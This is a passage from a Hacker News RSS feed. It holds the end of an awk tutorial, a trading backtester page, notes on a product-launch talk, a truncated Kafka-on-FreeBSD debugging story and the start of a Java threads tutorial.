<p>Sounds like we can use gawk here instead then. Let’s try pattern matching. I’m not going to go into regex here, but the pattern we want, defined by <code>"[^,]*|\"[^\"]+\""</code> is anything that either starts with a non-comma character, or starts with a double quote, contains only non-quote characters, and ends with a double quote:</p>

<div><div><pre><code><span>$ </span>gawk <span>'BEGIN { FPAT = "[^,]*|\"[^\"]+\"" } NR &lt;= 5 { print $2 }'</span> education.csv
<span>"Enrolment in primary, secondary and tertiary education levels"</span>

<span>"Total, all countries or areas"</span>
<span>"Total, all countries or areas"</span>
<span>"Total, all countries or areas"</span>
</code></pre></div></div>

<p>I snuck a <code>BEGIN</code> in there without explaining it. Let’s go on a brief tangent…</p>

<h3 id="begin--tangent-">BEGIN { tangent }</h3>

<p>Beyond the pattern and actions, awk also has a concept of <code>BEGIN</code> and <code>END</code> blocks. The <code>BEGIN</code> is executed before any of the data is processed. It can be useful for declaring variables or printing text to appear at the beginning. Analogously, the <code>END</code> is executed after the data is processed. It can be useful for performing manipulations on aggregates of the data, like averaging a sum.</p>

<p>This means if we wanted to write a little “Hello, awk!” program, we could do it without even needing a data file.</p>

<div><div><pre><code><span>$ </span><span>awk</span> <span>'BEGIN { print "Hello, awk!" }'</span>
Hello, <span>awk</span><span>!</span>
</code></pre></div></div>

<h3 id="end--tangent-">END { tangent }</h3>

<p>…back to our example. In our case, we used a <code>BEGIN</code> block to declare the <code>FPAT</code> <em>before</em> reading our data file.</p>

<p>But, we’ve only looked at the first 5 lines. For all we know, the rest of the file could look completely different. Let’s use <code>NR</code> again to see some more of the file. First, let’s figure out how long the file is. We can use the <code>END</code> block here. After we’ve parsed the whole file, we can see what the value of <code>NR</code> is, and that’ll tell us how many lines it is:</p>

<div><div><pre><code><span>$ </span><span>awk</span> <span>'END { print NR }'</span> education.csv
8630
</code></pre></div></div>

<p>Okay, so maybe if we print every 500 lines, we’ll get a sense of what data we’re looking at. We can set our pattern to be only if <code>NR</code> is a multiple of <code>500</code>:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR % 500 == 0'</span> education.csv
</code></pre></div></div>

<p>… and I’m going to leave this blog post on a real cliff hanger. Mostly because it already feels too long! There’s <a href="https://jemma.dev/blog/awk-part-2">a second post</a> about awk actually looking at the data and manipulating it to figure out which countries have stark differences in number of males and females that they educate.</p>

<h3 id="tldr-or-tlskimmed-far-enough-to-get-here-please-give-me-the-shorter-version">TL;DR or TL;Skimmed far enough to get here, please give me the shorter version:</h3>
<p>To rehash what we’ve learned about awk:</p>
<ul>
  <li>awk is run using <code>awk 'awk_program' data-file</code></li>
  <li>awk programs have the form <code>pattern { action }; pattern { action };</code></li>
  <li><code>BEGIN</code> blocks are executed before reading data files</li>
  <li><code>END</code> blocks are executed after reading data files</li>
  <li><code>NR</code> is a variable that tells us the number of rows read</li>
  <li><code>-F '&lt;separator&gt;'</code> is how we can define a field separator for a file</li>
  <li>Space is the default field separator</li>
  <li><code>FPAT="..."</code> is a way to use regex to define a pattern for each field</li>
  <li><code>FPAT</code> is only defined in gawk</li>
</ul>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://jemma.dev/blog/awk-part-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940661</guid>
            <pubDate>Fri, 30 Oct 2020 09:51:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Backtest Trading Strategies: A Quantopian Alternative]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24940644">thread link</a>) | @hydershykh
<br/>
October 30, 2020 | https://www.tradytics.com/backtester | <a href="https://web.archive.org/web/*/https://www.tradytics.com/backtester">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <div>
          <p>
            <h4>Trading Strategies Backtester</h4>
            <h5>Backtest your favorite technical analysis based strategies with our backtester.</h5>
          </p>
          
        </div>

        <div>
          

          <div>
            <div>
              <p>
                <h5>Buy Strategy</h5>
              </p>
              <div>
                <div>
                  
                  <div aria-labelledby="dropdownMenuButtonBuy">
                    <p onclick="make_current_ta('RSI')">RSI</p>
                    <p onclick="make_current_ta('CCI')">CCI</p>
                    <p onclick="make_current_ta('MFI')">MFI</p>
                    <p onclick="make_current_ta('MACD')">MACD</p>
                    <p onclick="make_current_ta('ATR')">ATR</p>
                    <p onclick="make_current_ta('ADX')">ADX</p>
                    <p onclick="make_current_ta('STOCHS')">STOCHS</p>
                  </div>
                </div>
                
                
                </div>
              <div>
                <h6>Pre-made</h6>
                <div>
                  <div aria-labelledby="dropdownMenuButtonPremade">
                    <p onclick="make_current_strategy('EMA9 > EMA20')">9EMA &gt; 20EMA</p>
                    <p onclick="make_current_strategy('EMA20 > EMA50')">20EMA &gt; 50EMA</p>
                    <p onclick="make_current_strategy('EMA9 < EMA20')">9EMA &lt; 20EMA</p>
                    <p onclick="make_current_strategy('EMA20 < EMA50')">20EMA &lt; 50EMA</p>
                    <p onclick="make_current_strategy('EMA20 > Price')">20EMA &gt; Price</p>
                    <p onclick="make_current_strategy('EMA50 > Price')">50EMA &gt; Price</p>
                    <p onclick="make_current_strategy('EMA20 < Price')">20EMA &lt; Price</p>
                    <p onclick="make_current_strategy('EMA50 < Price')">50EMA &lt; Price</p>
                    <p onclick="make_current_strategy('obv_slope > 0')">Pos OBV Slope</p>
                    <p onclick="make_current_strategy('obv_slope < 0')">Neg OBV Slope</p>
                    <p onclick="make_current_strategy('VWAP > Price')">VWAP &gt; Price</p>
                    <p onclick="make_current_strategy('VWAP < Price')">VWAP &lt; Price</p>
                    <p onclick="make_current_strategy('SIGNAL > MACD')">Signal &gt; MACD</p>
                    <p onclick="make_current_strategy('SIGNAL < MACD')">Signal &lt; MACD</p>
                    <p onclick="make_current_strategy('hband > Price')">UpperBollinger &gt; Price</p>
                    <p onclick="make_current_strategy('lband < Price')">LowerBollinger &lt; Price</p>
                    <!--<p class="dropdown-item" onclick="make_current_strategy('At Support')">At Support</p>
                    <p class="dropdown-item" onclick="make_current_strategy('At Resistance')">At Resistance</p>-->
                  </div>
                </div>
                </div>
            </div>
          </div>



          <div>
            <div>
              <p>
                <h5>Sell Strategy</h5>
              </p>
              <div>
                <div>
                  
                  <div aria-labelledby="dropdownMenuButtonSell">
                    <p onclick="make_current_ta_sell('RSI')">RSI</p>
                    <p onclick="make_current_ta_sell('CCI')">CCI</p>
                    <p onclick="make_current_ta_sell('MFI')">MFI</p>
                    <p onclick="make_current_ta_sell('MACD')">MACD</p>
                    <p onclick="make_current_ta_sell('ATR')">ATR</p>
                    <p onclick="make_current_ta_sell('ADX')">ADX</p>
                    <p onclick="make_current_ta_sell('STOCHS')">STOCHS</p>
                  </div>
                </div>
                
                
                </div>
              <div>
                <h6>Pre-made</h6>
                <div>
                  <div aria-labelledby="dropdownMenuButtonPremadeSell">
                    <p onclick="make_current_strategy_sell('EMA9 > EMA20')">9EMA &gt; 20EMA</p>
                    <p onclick="make_current_strategy_sell('EMA20 > EMA50')">20EMA &gt; 50EMA</p>
                    <p onclick="make_current_strategy_sell('EMA9 < EMA20')">9EMA &lt; 20EMA</p>
                    <p onclick="make_current_strategy_sell('EMA20 < EMA50')">20EMA &lt; 50EMA</p>
                    <p onclick="make_current_strategy_sell('EMA20 > Price')">20EMA &gt; Price</p>
                    <p onclick="make_current_strategy_sell('EMA50 > Price')">50EMA &gt; Price</p>
                    <p onclick="make_current_strategy_sell('EMA20 < Price')">20EMA &lt; Price</p>
                    <p onclick="make_current_strategy_sell('EMA50 < Price')">50EMA &lt; Price</p>
                    <p onclick="make_current_strategy_sell('obv_slope > 0')">Pos OBV Slope</p>
                    <p onclick="make_current_strategy_sell('obv_slope < 0')">Neg OBV Slope</p>
                    <p onclick="make_current_strategy_sell('VWAP > Price')">VWAP &gt; Price</p>
                    <p onclick="make_current_strategy_sell('VWAP < Price')">VWAP &lt; Price</p>
                    <p onclick="make_current_strategy_sell('SIGNAL > MACD')">Signal &gt; MACD</p>
                    <p onclick="make_current_strategy_sell('SIGNAL < MACD')">Signal &lt; MACD</p>
                    <p onclick="make_current_strategy_sell('hband > Price')">UpperBollinger &gt; Price</p>
                    <p onclick="make_current_strategy_sell('lband < Price')">LowerBollinger &lt; Price</p>
                  </div>
                </div>
                </div>
            </div>
          </div>
          
          
        </div> <!-- row -->


         <!-- row -->

         <!-- row -->

         <!-- row -->

        <div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="activity"></i> Win Rate</h6>
                </p>
                <p>Win rate of this strategy.</p>
                
                
              </div>
            </div>
          </div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="corner-right-down"></i> Biggest Drawdown</h6>
                </p>
                <p>Highest loss incurred in a trade.</p>
                
              </div>
            </div>
          </div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="navigation-2"></i> Biggest Win</h6>
                </p>
                <p>Highest profit gained in a trade.</p>
                
              </div>
            </div>
          </div>
        </div> <!-- row -->


        <div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="arrow-up"></i> Long Only</h6>
                </p>
                <p>Profits and losses from long positions.</p>
                
              </div> 
            </div>
          </div>

          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="arrow-down"></i> Short Only</h6>
                </p>
                <p>Profits and losses from short positions.</p>
                
              </div> 
            </div>
          </div>
        </div> <!-- row -->

        
        

      </div></div>]]>
            </description>
            <link>https://www.tradytics.com/backtester</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940644</guid>
            <pubDate>Fri, 30 Oct 2020 09:48:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Nailing Your First Launch by Adam Wathan]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940629">thread link</a>) | @reconquestio
<br/>
October 30, 2020 | https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/ | <a href="https://web.archive.org/web/*/https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>I’ve just watched the talk «Nailing Your First Launch» (MicroConf Starter 2018) by Adam Wathan and I
took notes that I’d like to share and re-visit them in the future. Some of them are just text from his screens, some thoughts are mine.</p>
<p>But don’t let me steal the video from you by providing a digested summary.
In my humble opinion, the main idea of watching talks or reading something is to change your mind
model of seeing this topic.
Don’t hesitate and start watching the video before proceeding to notes.
The notes are here just to come back from time to time and re-call some especially useful highlights.</p>
<p><a href="https://www.youtube.com/watch?v=ajrDxZRpP9M">https://www.youtube.com/watch?v=ajrDxZRpP9M</a></p>
<hr>

<h3 id="one-time-purchase-products-are-way-easier-to-sell">One-time purchase products are way easier to sell</h3>
<ul>
<li>Harder to convince people that for $9 dollars per month they’d have value.</li>
<li>But it’s a very frequent case when people buy $100 courses and don’t even watch them.</li>
<li>One-time payments are much easier to go away with.</li>
</ul>
<h3 id="they-can-be-done">They can be “done”</h3>
<ul>
<li>You don’t have to maintain them forever.</li>
<li>A course can be finished. A book can be finished.</li>
</ul>
<h3 id="you-can-put-one-together-in-3-months-of-nights-and-weekends">You can put one together in 3 months of nights and weekends</h3>
<ul>
<li>Easier to plan.</li>
</ul>
<h3 id="they-put-money-in-the-bank-fast-then-drop-off-opposite-to-saas">They put money in the bank fast then drop off (opposite to SAAS)</h3>
<ul>
<li>One-time projects do have a more clear cliff of death, but they produce more money than saas during
launch days.</li>
</ul>
<hr>

<h3 id="building-an-audience">Building an audience</h3>
<ul>
<li>
<p>Having a big audience can compensate for almost any mistake made in marketing/sales.</p>
</li>
<li>
<p>Huge audience + bad sales plan produces way more profit than no audience + good sales plan.</p>
</li>
<li>
<p>Produce blog posts, tutorials, podcasts, screencasts, interview people</p>
</li>
<li>
<p>You should be worth following (provide a value for your audience)</p>
</li>
<li>
<p>Help people where they already are (Wes Bos)</p>
</li>
<li>
<p>Specific tactics for tech guys: tweet your hacks (like some tricks with css) that save you time.</p>
</li>
</ul>
<h3 id="picking-the-right-idea">Picking the right idea</h3>
<ul>
<li>Have an idea
<ul>
<li>what are you already putting out there that peoeple seem excited about?</li>
<li>what are you excited about that you think others will get excited about?</li>
<li>what do people think you’re better at than they are?</li>
<li>what have you learned outside your community would benefit from?</li>
<li>what did you have to figure out yourself but was really helpful to learn?</li>
</ul>
</li>
<li>Test it
<ul>
<li>
<p>«First thing to do is to put a landing page and start emailing.»</p>
<p>It’s not a bad way, but it’s not the first thing that you should do.
Especially it doesn’t work if you have no audience. People wouldn’t trust you.</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>Collect feedback from tweets, have a catalog of them. Can be used later for your landing/sales pages.</p>
</blockquote>
<h3 id="define-the-product">Define the product</h3>
<ul>
<li>Plan small, it will end up bigger than you think anyway
<ul>
<li>Don’t worry about size. A short book is still a book.</li>
<li>3 hours of a video course is plenty.</li>
<li>Actually, not everyone is looking for a full knowledge base on a specific topic and read
500 pages on that. Collection of great ideas (like tweets) on that specific topic works
too.</li>
</ul>
</li>
</ul>
<blockquote>
<p>In general, courses are easier to sell at higher prices because people expect products such as
books to be in a specific cost range, even if they understand that it brings a high value.</p>
</blockquote>
<h3 id="landing-page">Landing page</h3>
<p>The goal is to collect e-mail addresses.</p>
<p>Example of Adam’s landing page can be seen on 19:33 - 22:25</p>
<ul>
<li>Promise something in advance (sign up for free screencasts and a big discount)</li>
<li>You can put your catalog of feedback on your landing page to earn more trust.</li>
</ul>
<h3 id="pre-sell">Pre-sell</h3>
<h4 id="advantages">Advantages</h4>
<ul>
<li>Best form of product validation</li>
<li>You’ll make more money</li>
<li>More motivation to finish</li>
<li>Can buy you the time to focus on the product</li>
</ul>
<h4 id="disadvantages">Disadvantages</h4>
<ul>
<li>Selling multiple tiers is trickier</li>
<li>Can’t easily change scope</li>
<li>Like taking on debt, can be extremely stressful. People paid you 50k$ and you have to return
it as the value in N months. (impostor syndrome?)</li>
</ul>
<h3 id="building-your-email-list">Building Your Email List</h3>
<ul>
<li>Always tell your audience.</li>
</ul>
<blockquote>
<p>Announce the announcement — «about to announce the next big project I’m working on; if you check
it out and are excited about it, I’d love any help spreading the word!»</p>
</blockquote>
<ul>
<li>Share progress. Send an update every week or so.</li>
<li>Repurpose content (Take a chapter from a book, make it a blog post and share it)</li>
</ul>
<h3 id="getting-it-finished">Getting it finished</h3>
<p>A few strategies to finally finish it:</p>
<ul>
<li>Make promises («this week I’m going to deliver a screencast»)</li>
<li>Email on a schedule</li>
<li>Reduce scope. (the project/book gets bigger and bigger, the best way to cross the finish line</li>
</ul>
<h3 id="figuring-pricing">Figuring pricing</h3>
<ul>
<li>It’s hard to sell tiers during pre-sales.</li>
<li>Sell pre-orders with top tier price.</li>
</ul>
<h4 id="single-tier">Single tier</h4>
<ul>
<li>Can be fine if you can charge enough</li>
<li>Often necessary if pre-selling</li>
<li>Nice if you can’t figure out a way to add additional tiers that actually feel valuable</li>
<li>In general, prefer multiple tiers</li>
</ul>
<h4 id="two-tiers">Two tiers</h4>
<ul>
<li>Usually a price anchoring strategy, first tier makes second tier look like better deal</li>
<li>Second tier is usually the “real” product</li>
<li>Prices are often close-ish, maybe 1x and 1.5x</li>
<li>Works well with video courses where easy to cut content for budget version</li>
</ul>
<h4 id="three-tiers">Three tiers:</h4>
<ul>
<li>Great for books if you can come up with the bonus content (videos?)</li>
<li>Makes it easier to evaluate as its own product instead of compring to Amazon book prices</li>
<li>Prices are usually 1x, ~2x, ~5x</li>
<li>This will make you a lot more money from a book than just selling the book on its own</li>
</ul>
<blockquote>
<p><strong>Adam’s case</strong></p>
<ul>
<li>First tier: The Bare Essentials, $39
<ul>
<li>The 158-page book in pdf format</li>
<li>Comprehensive set of exercises</li>
</ul>
</li>
<li>Second tier: The Premium Training Package, $79
<ul>
<li>Over 4 hours of screencasts, covering all of the book examples</li>
<li>Three additional advanced tutorials</li>
</ul>
<ul>
<li>all from first tier</li>
</ul>
</li>
<li>Third tier: The complete Reference Package, $179
<ul>
<li>The source code of Nitpick CI, a production Laravel application that makes heavy
use of collection pipelines</li>
</ul>
<ul>
<li>all from second tier</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="launch-discounts">Launch discounts</h3>
<ul>
<li>Discount it by enough to be appealing, at least 30%</li>
<li>Use stepped discounts; lower discount on cheaper tiers and better discount on higher tiers</li>
<li>Reverse engineer non-discounted price from your planned discounted price, it’ll help you charge more</li>
</ul>
<h3 id="nailing-the-launch">Nailing the launch</h3>
<ul>
<li>
<p>Build the sales page 39:13</p>
<ul>
<li>Still include an email sign up that sends preview content for new traffic (sign up to get
four free preview lessons)</li>
<li>Testimonials and social proof are important; use feedback from preview content to start</li>
<li>Sort tiers from highest price to lower price, use visuals to communicate value of higher
tiers (ui/ux hacks, make more important text bold, more physical things on a picture)</li>
</ul>
</li>
<li>
<p>Announce the launch details</p>
<ul>
<li>Include all package and pricing details</li>
<li>Complete TOC or content list</li>
<li>Final free content preview if possible</li>
</ul>
</li>
<li>
<p>Launch it</p>
<ul>
<li>Easiest part. Send an email — “xxx is now available!”, include discount</li>
<li>Launch on tuesday, no evidence, but it seems at least as good as any other day for Adam</li>
<li>Morning EST works well too</li>
</ul>
</li>
<li>
<p>Leverage early feedback</p>
<ul>
<li>Collect and catalog feedback after the launch.</li>
<li>Send new reviews to other people who hasn’t bought the course/book yet. Send them preview
of another chapter.</li>
</ul>
</li>
<li>
<p>Closing the launch</p>
<ul>
<li>Close the discount. Announce closing it. (“Hey, this is the last week of the launch”)</li>
<li>But don’t specify a closing date in advance</li>
</ul>
</li>
</ul>
<hr>
<h3 id="links">Links</h3>
<ul>
<li><a href="https://gist.github.com/adamwathan/30dc4230ac575cfa3425b39ca11ea859">Gist with useful links by Adam</a></li>
<li><a href="https://twitter.com/adamwathan">Twitter: @adamwathan</a></li>
<li><a href="https://adamwathan.me/">Blog: adamwathan.me</a></li>
<li><a href="https://www.youtube.com/watch?v=ajrDxZRpP9M">Talk on youtube</a></li>
</ul>
<p>
    Follow me on Twitter:
    <a target="_blank" href="https://twitter.com/reconquestio">@reconquestio</a>
    </p>

    <hr>
    <b>Comments</b>
    
    
</article>

        </div></div>]]>
            </description>
            <link>https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940629</guid>
            <pubDate>Fri, 30 Oct 2020 09:46:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kafka nightmare replication issues on FreeBSD (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940623">thread link</a>) | @letientai299
<br/>
October 30, 2020 | https://stacksoft.io/blog/kafka-troubles/ | <a href="https://web.archive.org/web/*/https://stacksoft.io/blog/kafka-troubles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <div>
        <div>
		  

<p>I recently created a tool for a client to export some data from a Kafka topic and after waiting about 10 minutes for it to export, the program returned a rather bizarre error:</p>

<pre><code>kafka: error while consuming telemetry/0: kafka server: Message contents does not match its CRC.

</code></pre>

<p>Intuition gave me a bad feeling about that error, but I was not prepared for what was going to come next. I decide to look up the error quickly and the error indicated that the CRC calculated by the consumer was not matching the message header. Huh, what was going on here?</p>

<p>Before I dive into this article, it’s helpful to learn a little bit about the software that was being run when we started running into this problem. We had 3 VMs on an Azure cluster that were running FreeBSD. The producers were using <a href="https://github.com/Shopify/sarama">https://github.com/Shopify/sarama</a> and the consumers were using <a href="https://github.com/bsm/sarama-cluster">https://github.com/bsm/sarama-cluster</a></p>

<p>What’s also interesting is, no matter how many machines we might have had in the cluster (if they were all FreeBSD), we most likely would have experienced failure across the board. This wasn’t really great since the entire point of replicating the cluster across N machines was to prevent complete system failure. In this case, it really wouldn’t have helped us. A tear falls down my cheek for failed distributed programming promises.</p>

<table>
<thead>
<tr>
<th>Software</th>
<th>Version</th>
</tr>
</thead>

<tbody>
<tr>
<td>FreeBSD</td>
<td>11.0-RELEASE-p8</td>
</tr>

<tr>
<td>ZFS</td>
<td>-</td>
</tr>

<tr>
<td>Kafka</td>
<td>0.10.2</td>
</tr>

<tr>
<td>Zookeeper</td>
<td>3.4.10</td>
</tr>

<tr>
<td>OpenJDK</td>
<td>1.8.0_121-b13</td>
</tr>

<tr>
<td>Sarama</td>
<td>5e8fd95863bd4a894fcd29225547d56967f189ad</td>
</tr>

<tr>
<td>Sarama-cluster</td>
<td>d98592677c0aa08d8aafb882d344fb461682b722</td>
</tr>
</tbody>
</table>

<p>A little bit after my export tool ran, I got a ping on Slack that one of the services that uses this Kafka topic was no longer working. I check the logs of that service, and sure enough, the same error:</p>

<pre><code>kafka: error while consuming topic/0: kafka server: Message contents does not match its CRC.

</code></pre>

<p>Because this was a live running service, my first thought was to use the power of Kafka to shift the offset by 1 for this particular consumer so we can skip this corrupt message and get everything running again quickly.</p>

<p><code>kafka-consumer-groups.sh</code> is a command line tool that let’s you do exactly this, except it doesn’t work on <code>kafka-0.10.2</code>. That was a little bit of a surprise to me, I assumed one of the coolest things about Kafka is that you can pick an offset to consume from. The libraries we were using also had no way to manually select an offset to start from.</p>

<p>Okay, crap, so I need to upgrade Kafka to shift the offsets. This is a good opportunity to get on <code>1.0.0</code> anyway and perhaps restarting the services will actually fix the problem. I update my Ansible scripts for <code>kafka 1.0.1</code> and start reading the upgrade guide for a live running environment: <a href="https://kafka.apache.org/documentation/#upgrade">https://kafka.apache.org/documentation/#upgrade</a>.</p>

<p>Great, we’re on <code>1.0.1</code>, but the problem still exists. I have the ability to move the offet over, so I shift the offset by 1.</p>

<pre><code>./kafka-consumer-groups.sh --bootstrap-server localhost:9092 --group "api-consumer-group" --topic "telemetry:0" --reset-offsets --shift-by 1 --execute
</code></pre>

<p>I restart the service and the error comes up again. Darn. So it’s not only one message that is corrupt, it’s a range, that’s not great. I decided to commit to this strategy because this service needed to be up and running for a live demo in the coming week.</p>

<p>So instead, my idea was to shift the offset by a larger number until I find a number that actually works. Once I find a number that works, I can do a manual binary search to find the exact offset where the corruption started and shift it by 1.</p>

<p>After doing a manual binary search, I have found that the corrupted records are between <code>23769420-23772231</code> inclusive and corrupted, so good messages begin at <code>23772232</code> so 2811 corrupted messages. I run <code>./kafka-consumer-groups.sh</code> again, but this time I specify the exact offset to start from instead of using <code>shift-by</code></p>

<p>I restart the service again, and it works! Great, let’s hope this monkey patch works until the live demo. Nope, the next day, the same message appears again.</p>

<p>At this point, I’ve had my fair share of complicated problems, and I have a deep gut instinct that it’s most likely not the code we’ve written because the problem started to appear on multiple other topics in the cluster and the problem was produced by multiple independent services.</p>

<p>Of course, the book Pragmatic Programmer still pops up in my head:</p>

<p><em>“select” Isn’t Broken</em>:</p>

<blockquote>
<p>It is rare to find a bug in the OS or the compiler, or even a third-party product or library. The bug is most likely in the application.</p>
</blockquote>

<p>So I focus on starting from the application and then working outwards, I upgrade our libraries used in our code. I upgrade Sarama to <code>1.6.0</code> and I upgrade <code>sarama-cluster</code> to <code>master</code>. I run our deployment scripts and everything is running again.</p>

<p>I do the ridiculous offset binary-search trick again to shift everything and sure enough the issue comes up again with our Kafka libraries upgraded to the latest version. I decide to look at the logs of the broker themslelves and this is what I see;</p>

<pre><code>[2018-03-17 20:11:58,551] ERROR [ReplicaFetcher replicaId=1, leaderId=3, fetcherId=0] Error for partition telemetry-0 to broker 3:org.apache.kafka.common.errors.CorruptRecordException: This message has failed its CRC checksum, exceeds the valid size, or is otherwise corrupt. (kafka.server.ReplicaFetcherThread)
[2018-03-17 20:11:58,747] ERROR [ReplicaFetcher replicaId=1, leaderId=2, fetcherId=0] Error for partition topic-2 to broker 2:org.apache.kafka.common.errors.CorruptRecordException: This message has failed its CRC checksum, exceeds the valid size, or is otherwise corrupt. (kafka.server.ReplicaFetcherThread)
</code></pre>

<p>Looking at that error message, it appears that the replica thread inside of Kafka is running into exactly the same problem as our consumers. Uh oh, at this point I know it’s definitely not our application code, so much for that Pragmatic Programmer tip, gut instinct all the way!</p>

<p>There is a Kafka tool to let’s you see deeper into the health of your cluster <code>./kafka-topics.sh --zookeeper localhost:2181 --describe</code>. Here’s the output:</p>

<pre><code>Topic:telemetry PartitionCount:6 ReplicationFactor:3 Configs:
 Topic: telemetry Partition: 0 Leader: 2 Replicas: 2,1,3 Isr: 2
 Topic: telemetry Partition: 1 Leader: 3 Replicas: 3,2,1 Isr: 3
 Topic: telemetry Partition: 2 Leader: 1 Replicas: 1,3,2 Isr: 1
 Topic: telemetry Partition: 3 Leader: 2 Replicas: 2,3,1 Isr: 2
 Topic: telemetry Partition: 4 Leader: 3 Replicas: 3,1,2 Isr: 3
 Topic: telemetry Partition: 5 Leader: 1 Replicas: 1,2,3 Isr: 1
</code></pre>

<p>If you look at the <code>Isr</code> column, it stands for <code>In-Sync</code> replica. It appears that this cluster is not healthy because only the leader broker is in sync while all the other brokers cannot replicate that partition. Our goal here is to get that <code>Isr</code> column back to <code>1,2,3</code>.</p>

<p>So at this point, here are the options:</p>

<ul>
<li>- Hardware failure, such as disk failure, or network connectivity issues.</li>
<li>- The cluster is misbehaving because of resource allocation issues, perhaps it’s going OOM, or we’re out disk space.</li>
<li>- A bug with the Kafka version we were using</li>
<li>- An OpenJDK bug</li>
</ul>

<p>I decide to quickly look into our various servers to see if this is a resource allocation issue that is causing Kafka to misbehave. This was a red herring, one of the servers that was responsible for pushing to this topic actually filled its root partition and for a second I thought that might have been the issue, but that issue was fixed and the issue still remained.</p>

<p>The actual Kafka instances seemed to be fine, they were nowhere near capacity in terms of disk space, and the chances of having hardware failure across 3 machines was unlikely.</p>

<p>it gets a little confusing on what could be wrong and I start to realize that this is becoming a difficult problem and we have to get this live system working. I can’t just adjust things at random and hope that the problem is fixed. It’s time to dig deeper, it’s time to look at what Kafka is actually writing to disk.</p>

<h3 id="digging-deeper">Digging deeper</h3>

<p>Kafka writes the messages it receives into a log folder. The log folder contains a folder for each topic and partition combo. This is how it might look for this particular topic we’re having issues with:</p>

<pre><code>.
|-- telemetry-0
|   |-- 00000000000000000000.index
|   |-- 00000000000000000000.log
|   |-- 00000000000000000000.timeindex
|   |-- 00000000000003859610.index
|   |-- 00000000000003859610.log
|   |-- 00000000000003859610.snapshot
|   |-- 00000000000003859610.timeindex
|   |-- 00000000000008551431.index
|   |-- 00000000000008551431.log
|   |-- 00000000000008551431.snapshot
|   |-- 00000000000008551431.timeindex
|   |-- 00000000000012458429.snapshot
|   `-- leader-epoch-checkpoint
|-- telemetry-1
|   |-- 00000000000000000000.index
|   |-- 00000000000000000000.log
|   |-- 00000000000000000000.timeindex
|   |-- 00000000000003854233.index
|   |-- 00000000000003854233.log
|   |-- 00000000000003854233.timeindex
|   |-- 00000000000008541867.index
|   |-- 00000000000008541867.log
|   |-- 00000000000008541867.timeindex
|   `-- leader-epoch-checkpoint
|-- telemetry-2
|   |-- 00000000000000000000.index
|   |-- 00000000000000000000.log
|   |-- 00000000000000000000.timeindex
|   |-- 00000000000003850719.index
|   |-- 00000000000003850719.log
|   |-- 00000000000003850719.timeindex
|   |-- 00000000000008543680.index
|   |-- 00000000000008543680.log
|   |-- 00000000000008543680.timeindex
|   `-- leader-epoch-checkpoint

</code></pre>

<p>The <code>.log</code> file is where the messages we push to Kafka are stored. We’re going to attempt to extract the offset that is corrupt to see what exactly is corrupt about it. If you’re curious on learning about the internals of Kafka, check out this article, it was a lot simpler than I thought: <a href="https://thehoard.blog/how-kafkas-storage-internals-work-3a29b02e026">https://thehoard.blog/how-kafkas-storage-internals-work-3a29b02e026</a></p>

<p>Kafka provides a tool, <code>kafka.tools.DumpLogSegments</code> that lets you dive into these log files and grab more details about individual records that are in the file. Hilariously enough, when I ran this tool, it bails right when it hits a corrupt message.</p>

<pre><code>Exc…</code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stacksoft.io/blog/kafka-troubles/">https://stacksoft.io/blog/kafka-troubles/</a></em></p>]]>
            </description>
            <link>https://stacksoft.io/blog/kafka-troubles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940623</guid>
            <pubDate>Fri, 30 Oct 2020 09:45:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Java Concurrency – Understanding the Basics of Threads]]>
            </title>
            <description>
<![CDATA[
Score 134 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24940545">thread link</a>) | @turkogluc
<br/>
October 30, 2020 | https://turkogluc.com/java-concurrency-basics-of-threads/ | <a href="https://web.archive.org/web/*/https://turkogluc.com/java-concurrency-basics-of-threads/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>Java <code>Thread</code> objects allow us to run our code in separate threads. When an application starts JVM creates the initial thread named <code>main</code>. The main method is run on the main thread. Inside the application we can create new threads to execute other tasks in parallel with the main thread.</p><p>Java uses native operating system threads. So one java thread is mapped by one OS thread.</p><h3 id="creating-threads">Creating Threads</h3><p>The constructor of the <code>Thread</code> class takes a <code>Runnable</code> object. Runnable interface has an abstract <code>run</code> method which is called by <code>Thread#start()</code> method. It object can be instantiated by a lambda, anonymous class or a class which implements Runnable method. </p><figure><img src="https://turkogluc.com/content/images/2020/10/Screenshot-2020-10-29-at-20.03.52.png"></figure><p>Using lambdas are generally easier and more compact:</p><pre><code>Thread thread = new Thread(() -&gt; {
    // content of run command
});
